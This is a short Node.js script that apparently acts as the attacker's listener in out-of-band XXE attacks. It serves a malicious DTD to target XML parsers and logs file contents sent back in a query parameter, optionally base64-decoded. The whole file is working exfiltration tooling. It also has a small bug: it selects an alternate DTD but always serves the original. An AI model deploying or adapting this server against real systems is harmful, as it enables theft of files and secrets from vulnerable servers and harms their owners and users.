const http = require('http');
const https = require('https');
const url = require('url');
const fs = require('fs');
const argv = require('minimist')(process.argv.slice(2));

var is_base64 = argv.b64 ? true : false;
var listening_port = argv.p == undefined ? 8800 : argv.p;
var main_ip = argv.target;
var proto = argv.https ? https : http;

var options = argv.https ? {
	key: fs.readFileSync(argv.key),
	cert: fs.readFileSync(argv.cert)
} : {};


proto.createServer(options, (req, res) => {

	var path = url.parse(req.url, true).pathname;

	var now = new Date();

	console.log(`[${now.getFullYear()}-${now.getMonth()+1}-${now.getDate()} ` 
		+ `${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}] ${req.connection.remoteAddress} - ${req.method} - ${path}`);

	if (path.endsWith("send.dtd")) {
		var file = "./send.dtd";

		if (main_ip != undefined && req.connection.remoteAddress.includes(main_ip)) {
			file = "./send-alt.dtd"
		}

		fs.readFile("./send.dtd", function(error, content){
			res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
			res.end(content, 'utf-8');
		});
	}	
	else {
		var queries = url.parse(req.url, true).query;
		if (queries != null && queries.f != null) {
			var treasure = queries.f;
			if (is_base64) {
				treasure = new Buffer(queries.f, 'base64').toString("ascii");
			}

			var src = queries.alt == 'true' ? 'alt' : 'original';
			console.log(`Payload ${queries.p} sourced from ${src} DTD returned\n ${treasure} \n\n`);
		}
		res.end();
	}

}).listen(listening_port);
